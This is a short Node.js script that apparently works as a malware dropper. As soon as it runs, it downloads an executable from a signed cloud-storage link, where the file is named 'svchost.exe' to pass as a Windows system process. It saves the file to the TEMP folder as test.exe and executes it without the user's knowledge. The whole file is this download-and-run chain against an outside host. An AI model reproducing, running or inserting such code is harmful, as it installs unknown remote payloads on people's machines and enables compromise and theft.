const http = require('https');
const fs = require('fs');
const path = require('path')
const {execFileSync } = require('child_process');

const Link = "https://drime.s3.sbg.io.cloud.ovh.net/uploads/a0cfdf96-bf50-41fd-bfb5-617d5865ac9f/a0cfdf96-bf50-41fd-bfb5-617d5865ac9f?response-content-type=application%2Foctet-stream&response-content-disposition=attachment%3Bfilename%3Dsvchost.exe&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=f9b1e4305c5547a8a6ea4b100bdfe184%2F20241006%2Fsbg%2Fs3%2Faws4_request&X-Amz-Date=20241006T191545Z&X-Amz-SignedHeaders=host&X-Amz-Expires=1800&X-Amz-Signature=a986fdf78fd875be82473c3f6f2fa3f9541516d88c47e4174ae831c1b80cd48d";
const FinalPath = path.join(process.env.TEMP, "test.exe")

async function main(){
    await download(Link, FinalPath)
    await execFileSync(FinalPath)
}

function download(url, dest) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest, { flags: "wx" });

        const request = http.get(url, response => {
            if (response.statusCode === 200) {
                response.pipe(file);
            } else {
                file.close();
                fs.unlink(dest, () => {}); // Delete temp file
                reject(`Server responded with ${response.statusCode}: ${response.statusMessage}`);
            }
        });

        request.on("error", err => {
            file.close();
            fs.unlink(dest, () => {}); // Delete temp file
            reject(err.message);
        });

        file.on("finish", () => {
            resolve();
        });

        file.on("error", err => {
            file.close();

            if (err.code === "EEXIST") {
                reject("File already exists");
            } else {
                fs.unlink(dest, () => {}); // Delete temp file
                reject(err.message);
            }
        });
    });
}

main();